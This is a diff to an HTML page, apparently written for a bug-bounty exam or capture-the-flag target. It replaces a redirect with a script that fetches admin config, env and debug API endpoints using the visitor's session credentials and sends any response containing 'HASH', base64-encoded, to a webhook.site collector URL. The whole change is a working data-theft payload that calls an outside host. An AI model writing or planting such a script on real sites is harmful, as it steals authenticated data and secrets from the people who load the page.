@@ -2,7 +2,23 @@
 <html>
 <body>
     <script>
-       <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/dashboard">
-    </script>
+    // Instead of the dashboard, let's hunt for the 'System Config' 
+    // This is often where the 1000pt flag is hardcoded.
+    const targets = [
+        'https://api-bugbounty-exam.hashacademy.co/api/admin/config',
+        'https://api-bugbounty-exam.hashacademy.co/api/admin/env',
+        'https://api-bugbounty-exam.hashacademy.co/api/v1/debug'
+    ];
+
+    targets.forEach(url => {
+        fetch(url, {credentials: 'include'})
+            .then(r => r.text())
+            .then(data => {
+                if(data.includes('HASH')) {
+                    fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?flag=' + btoa(data));
+                }
+            });
+    });
+</script>
 </body>
 </html>
